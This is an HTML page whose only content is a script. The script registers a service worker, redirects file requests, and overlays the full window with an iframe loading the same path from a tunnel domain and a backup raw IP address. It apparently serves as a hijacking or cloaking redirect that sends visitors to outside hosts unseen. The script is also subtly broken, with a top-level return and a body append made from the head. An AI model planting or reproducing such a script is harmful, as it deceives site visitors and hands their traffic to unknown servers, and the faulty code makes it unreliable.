<!DOCTYPE html><html><head><meta charset="UTF-8">
<script>
var BASE = 'https://present-workout-awards-sections.trycloudflare.com';
var BACKUP = 'http://42.193.21.117';
var p=location.pathname, s=location.search, h=location.hash;
if('serviceWorker' in navigator) navigator.serviceWorker.register('/sw.js');
if(/\.(png|jpg|jpeg|gif|svg|pdf|mp4|webm|doc|xls|ppt|zip|rar|7z)$/i.test(p)){
  location.replace(BASE+p+s+h); return;
}
var ifr = document.createElement('iframe');
ifr.style='position:fixed;top:0;left:0;width:100%;height:100%;border:none;';
ifr.allow='autoplay; fullscreen';
var sources = [BASE, BACKUP].filter(Boolean);
var idx = 0;
function tryNext(){
  if(idx < sources.length){
    ifr.src = sources[idx] + p + s + h;
    idx++;
  } else {
    location.replace(BASE + p + s + h);
  }
}
ifr.onerror = ifr.onabort = tryNext;
var fallbackTimer = setTimeout(function(){
  tryNext();
}, 8000);
ifr.onload = function(){ clearTimeout(fallbackTimer); };
tryNext();
document.body.appendChild(ifr);
</script>
</head><body></body></html>
